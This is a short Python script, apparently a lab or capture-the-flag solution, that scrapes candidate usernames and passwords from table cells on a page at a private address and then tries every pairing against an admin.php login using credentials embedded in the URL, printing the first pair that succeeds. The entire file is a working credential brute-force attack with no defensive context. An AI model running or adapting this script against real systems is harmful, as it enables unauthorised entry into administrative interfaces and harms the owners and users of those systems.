import requests
from bs4 import BeautifulSoup


page = requests.get("http://172.16.120.120")
soup = BeautifulSoup(page.content, 'html.parser')
all_td = soup.find_all('td')
length = len(all_td)
possible_users = []
possible_passwords = []
for i in range(0,length,2):
    possible_users.append(all_td[i].get_text())
    possible_passwords.append(all_td[i+1].get_text())
Found = False
for user in possible_users:
    for password  in possible_passwords:
        request = requests.post("http://" + user + ":" +  password + "@172.16.120.120/admin.php")
        if request.status_code == 200:
            print("Username : " + user + " Password : " + password)
            Found = True
            break
    if Found:
        break
    